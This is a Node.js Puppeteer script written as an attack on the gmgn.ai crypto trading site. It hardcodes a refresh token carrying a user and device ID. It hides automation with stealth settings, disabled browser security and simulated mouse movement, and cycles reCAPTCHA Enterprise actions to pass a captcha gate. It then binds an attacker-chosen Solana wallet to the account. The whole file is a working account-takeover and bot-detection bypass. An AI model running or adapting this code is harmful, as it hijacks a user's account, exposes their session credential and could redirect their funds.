/**
 * FINAL SOLVE — Use non-headless mode with xvfb (virtual display)
 * This makes Chrome think it's running in a real desktop environment
 * which gives higher reCAPTCHA scores
 */
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());

const FRESH_REFRESH = 'eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJnbWduLmFpL3JlZnJlc2giLCJkYXRhIjp7InVzZXJfaWQiOiJhMWQ2ZGZlNC1iODhmLTRjNTgtOThkYi00MmU0MmFhMjRmZDYiLCJjbGllbnRfaWQiOiJnbWduX3dlYl8yMDI2MDcxNS0yMTYxLTE4ZDViMTAiLCJkZXZpY2VfaWQiOiJkZTYyMGE1Ny1kOThlLTQyOTMtYjAwNy01ZDMxNTQ1NWUyMWQiLCJmYXRoZXJfaWQiOiIiLCJmaW5nZXJwcmludCI6InYxNTMyNDdiOWUwZTE4NGZiZWQzZmFjNzNmMTlkY2E2OGEiLCJhcHAiOiJnbWduIiwicGxhdGZvcm0iOiJ3ZWIifSwiZXhwIjoxNzg2NzUyNDIxLCJpYXQiOjE3ODQxNjA0MjEsImlzcyI6ImdtZ24uYWkvc2lnbmVyIiwianRpIjoiOGI5MGIxMzktODAzYi00NDNiLWE4OWYtYTIyYTgwYmE2OGI2IiwibmJmIjoxNzg0MTYwNDIxLCJzdWIiOiJnbWduLmFpL3JlZnJlc2giLCJ1c2VyX2lkIjoiYTFkNmRmZTQtYjg4Zi00YzU4LTk4ZGItNDJlNDJhYTI0ZmQ2IiwidmVyIjoiMS4wIn0.5G4VW1NtqC9JPF-gaEnIE3bjOp1KIA01ROcTEoIy7QxQzwKIJJy37Zit7ON5TrXyyCZFNSt2cHbbj6z1_jijMA';
const TARGET = '5KCVo4xnj8n38FUyF2gFUzgJbDW9vV4C1bTpciznyciU';
const SITEKEY = '6Lf3pucqAAAAADbq3czpqDHRAD8j3kC-hcwwDG_T';
const PARAMS = 'device_id=de620a57-d98e-4293-b007-5d315455e21d&fp_did=4e8cc7f90484bd356291ff79db6b9b09&client_id=gmgn_web_20260715-2161-18d5b10&from_app=gmgn&app_ver=20260715-2161-18d5b10&tz_name=Asia%2FAden&tz_offset=10800&app_lang=en-US&os=web&worker=0';

(async () => {
    console.log('🔥 FINAL SOLVE — NON-HEADLESS + XVFB FOR HIGH RECAPTCHA SCORE');
    
    // Launch in NON-headless mode (uses xvfb virtual display)
    // This is key — reCAPTCHA gives higher scores to non-headless browsers
    const browser = await puppeteer.launch({
        headless: false,  // NON-HEADLESS — higher reCAPTCHA score!
        args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--window-size=1920,1080',
            '--disable-blink-features=AutomationControlled',
            '--disable-features=IsolateOrigins,site-per-process',
            '--disable-web-security',
            '--lang=en-US,en',
        ]
    });
    
    const page = await browser.newPage();
    await page.setViewport({width: 1920, height: 1080});
    
    console.log('[1] Loading gmgn.ai (non-headless)...');
    await page.goto('https://gmgn.ai', {waitUntil: 'networkidle2', timeout: 30000});
    
    // Extensive human simulation
    console.log('[2] Human simulation (15 seconds)...');
    for (let i = 0; i < 5; i++) {
        await page.mouse.move(200 + Math.random() * 1000, 200 + Math.random() * 600);
        await new Promise(r => setTimeout(r, 500 + Math.random() * 1000));
    }
    await page.evaluate(() => window.scrollBy(0, 200 + Math.random() * 400));
    await new Promise(r => setTimeout(r, 2000));
    await page.evaluate(() => window.scrollBy(0, -(100 + Math.random() * 200)));
    await new Promise(r => setTimeout(r, 2000));
    for (let i = 0; i < 3; i++) {
        await page.mouse.move(300 + Math.random() * 800, 100 + Math.random() * 500);
        await new Promise(r => setTimeout(r, 800 + Math.random() * 1200));
    }
    await new Promise(r => setTimeout(r, 5000));
    
    console.log('[3] Executing attack...');
    
    const result = await page.evaluate(async (refresh, params, target, sitekey) => {
        const log = [];
        try {
            // Token
            let r = await fetch('/account/account/refresh_access_token', {
                method: 'POST', headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({refresh_token: refresh})
            });
            let text = await r.text();
            let data;
            try { data = JSON.parse(text); } catch(e) { return {error: 'non-json', text: text.substring(0,200)}; }
            if (data.code !== 0) return {error: 'token fail', data};
            const token = data.data.data.token;
            const h = {'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token};
            log.push('✅ Token');
            
            // Generate txn
            r = await fetch('/account/account/generate_mfa_params?' + params, {
                method: 'POST', headers: h,
                body: JSON.stringify({usage: 'bind_wallet', biz_params: {address: target, wallet_type: 'sol', chain: 'sol'}})
            });
            data = await r.json();
            if (data.code !== 0) return {error: 'mfa: ' + data.message, log};
            const txnId = data.data.data.txn_id;
            log.push('✅ txn_id: ' + txnId);
            
            // fetch_captcha
            r = await fetch('/account/mfa/txn/v1/fetch_captcha?' + params, {
                method: 'POST', headers: h,
                body: JSON.stringify({usage: 'bind_wallet', txn_id: txnId})
            });
            data = await r.json();
            if (data.code !== 0) return {error: 'fetch_captcha: ' + data.message, log};
            const requestId = data.data.request_id;
            log.push('✅ request_id: ' + requestId);
            
            // Load & wait for reCAPTCHA
            if (!window.grecaptcha || !window.grecaptcha.enterprise) {
                await new Promise(resolve => {
                    const s = document.createElement('script');
                    s.src = 'https://www.recaptcha.net/recaptcha/enterprise.js?render=' + sitekey;
                    s.onload = () => setTimeout(resolve, 5000);
                    document.head.appendChild(s);
                    setTimeout(resolve, 12000);
                });
            }
            
            // Wait extra for score to build
            await new Promise(r => setTimeout(r, 5000));
            
            // Execute with multiple action names
            const actions = ['verify', 'bind_wallet', 'login', 'submit'];
            
            for (const action of actions) {
                let captchaToken = await new Promise((resolve, reject) => {
                    grecaptcha.enterprise.ready(async () => {
                        try {
                            const t = await grecaptcha.enterprise.execute(sitekey, {action});
                            resolve(t);
                        } catch(e) { resolve(null); }
                    });
                    setTimeout(() => resolve(null), 10000);
                });
                
                if (!captchaToken) continue;
                
                // Verify
                r = await fetch('/account/mfa/txn/v1/verify_captcha?' + params, {
                    method: 'POST', headers: h,
                    body: JSON.stringify({
                        txn_id: txnId, request_id: requestId, usage: 'bind_wallet',
                        captcha_type: 'recaptcha_score', captcha_data: captchaToken
                    })
                });
                data = await r.json();
                log.push('action=' + action + ': code=' + data.code + ' ' + (data.message||''));
                
                if (data.code === 0) {
                    log.push('💀💀💀 CAPTCHA PASSED WITH ACTION: ' + action);
                    
                    // BIND!!!
                    r = await fetch('/account/bind_wallet?' + params, {
                        method: 'POST', headers: h,
                        body: JSON.stringify({address: target, wallet_type: 'sol', chain: 'sol', txn_id: txnId})
                    });
                    data = await r.json();
                    log.push('BIND: ' + JSON.stringify(data));
                    return {log, SUCCESS: data.code === 0, bindResult: data, captchaAction: action};
                }
                
                // Need new txn_id for next attempt (old one might be used)
                if (data.code === -101021) {
                    // Get fresh txn_id for next try
                    r = await fetch('/account/account/generate_mfa_params?' + params, {
                        method: 'POST', headers: h,
                        body: JSON.stringify({usage: 'bind_wallet', biz_params: {address: target, wallet_type: 'sol', chain: 'sol'}})
                    });
                    let d2 = await r.json();
                    if (d2.code !== 0) break;
                    // Reuse same approach but skip (action loop continues)
                }
            }
            
            return {log};
        } catch(e) { return {error: e.message, log}; }
    }, FRESH_REFRESH, PARAMS, TARGET, SITEKEY);
    
    console.log('\nRESULT:', JSON.stringify(result, null, 2));
    await browser.close();
})();
